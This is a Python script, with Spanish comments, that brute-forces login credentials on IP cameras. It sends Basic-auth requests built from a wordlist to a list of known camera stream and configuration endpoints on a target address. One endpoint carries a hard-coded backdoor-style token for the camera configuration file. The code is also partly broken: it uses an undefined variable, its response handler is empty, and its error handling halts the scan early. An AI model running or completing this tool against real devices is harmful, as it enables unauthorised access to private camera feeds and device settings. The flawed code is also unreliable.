import concurrent.futures
import base64
import requests
import command

class SolicitudHandler:
    def __init__(self, ip, port, usuarios, carga_cancelada, resultados):
        self.ip = ip
        self.port = port
        self.usuarios = usuarios
        self.carga_cancelada = carga_cancelada
        self.resultados = resultados
        self.urls = [
            f'http://{self.ip}:{self.port}/video.mjpg',
            f'http://{self.ip}:{self.port}/cgi-bin/viewer/video.jpg',
            f'http://{self.ip}:{self.port}/onvif/Media',
            f'http://{self.ip}:{self.port}/System/configurationFile?auth=YWRtaW46MTEK',
            f'http://{self.ip}:{self.port}/pda.htm',
            f'http://{self.ip}:{self.port}/main.htm',
            f'http://{self.ip}:{self.port}/video.cgi?',
            f'http://{self.ip}:{self.port}/web/mobile.html',
            f'http://{self.ip}:{self.port}/asp/video.cgi',
            f'http://{self.ip}:{self.port}/serverpush.htm'
        ]

    def enviar_solicitud(self):
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(self.enviar_solicitud_individual, url) for url in set(self.urls)]
            concurrent.futures.wait(futures)

    def enviar_solicitud_individual(self, url):
        for usuario, contraseña in self.usuarios.items():
            try:
                credentials = base64.b64encode(f'{usuario}:{contraseña}'.encode('utf-8')).decode('utf-8')
                
                headers = {
                    'Authorization': f'Basic {credentials}',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'es-ES,es;q=0.9',
                    'Connection': 'close'
                }

                response = requests.get(url, headers=headers, stream=True, timeout=0.5)
                response.raise_for_status()

                if response.status_code == 200:
                    self.manejar_respuesta(url, response, usuario, contraseña)

                    # Detener la exploración después de encontrar la primera vulnerabilidad
                    if len(self.resultados) > 0:
                        return
                else:
                    # Puedes agregar lógica aquí para manejar otros casos si es necesario
                    pass

            except requests.exceptions.RequestException:
                self.resultados.append(None)

    def manejar_respuesta(self, url, response, usuario, contraseña):
        # Aquí iría la lógica para manejar la respuesta.
        pass

# Uso de la clase
usuarios = {}
# Cargar el wordlist desde el archivo de texto si se proporciona
if command.args.w:
    with open(args.w, 'r') as file:
        for line in file:
            key, value = line.strip().split(':')
            usuarios[key] = value
